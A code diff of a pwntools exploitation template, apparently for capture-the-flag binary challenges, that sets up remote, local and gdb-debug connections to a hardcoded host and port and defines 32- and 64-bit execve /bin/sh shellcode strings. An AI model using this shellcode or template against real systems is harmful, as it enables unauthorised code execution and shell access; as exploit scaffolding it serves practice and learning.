@@ -4,38 +4,33 @@ from enert import *
 # =========================
 # TEMPLATE FOR EXPLOITATION
 # =========================
-context(os="linux", arch="amd64")
+context(os="linux", arch="ARCH NAME HERE")
 context.log_level = "debug" # output verbose log
-FILE_NAME   = "./a.out"
-#REMOTE_LIBC = "./libc.so.6-hoge"
-LOCAL_LIBC  = "/lib/x86_64-linux-gnu/libc.so.6"
-REMOTE_HOST = "178.62.249.106"
-REMOTE_PORT = 8642
-LOCAL_HOST  = "localhost"
-LOCAL_PORT  = 4444
-binary      = ELF(FILE_NAME)
-r           = None
-dflg        = 0
+BINARY = "BINARY NAME HERE"
+#R_LIBC = "./libc.so.6-hoge"
+L_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
+R_HOST = "178.62.249.106"
+R_PORT = 8642
+L_HOST = "localhost"
+L_PORT = 4444
+elf    = ELF(BINARY)
+s      = None
 if len(sys.argv) > 1 and sys.argv[1] == "r":
-    r = remote(REMOTE_HOST, REMOTE_PORT)
-    #libc = ELF(REMOTE_LIBC)
+    s = remote(R_HOST, R_PORT)
+    #libc = ELF(R_LIBC)
 elif len(sys.argv) > 1 and sys.argv[1] == "l":
-    r = process(FILE_NAME)
-    libc = ELF(LOCAL_LIBC)
+    s = process(elf)
+    libc = ELF(L_LIBC)
 else:
-    r = remote(LOCAL_HOST, LOCAL_PORT)
-    libc = ELF(LOCAL_LIBC)
+    s = remote(L_HOST, L_PORT)
+    libc = ELF(L_LIBC)
 
 if len(sys.argv) > 1 and sys.argv[1] == "d":
-    s = remote(LOCAL_HOST, LOCAL_PORT)
+    s = remote(L_HOST, L_PORT)
     f = open("gdbrc", "r")
     time.sleep(0.5)
-    pid = proc.pid_by_name(binary)
+    pid = proc.pid_by_name(BINARY)
     gdb.attach(pid[0], f)
-
-def b():
-    if dflg == 1:
-        raw_input("break.")
 
 sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
 sc_execve64 = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
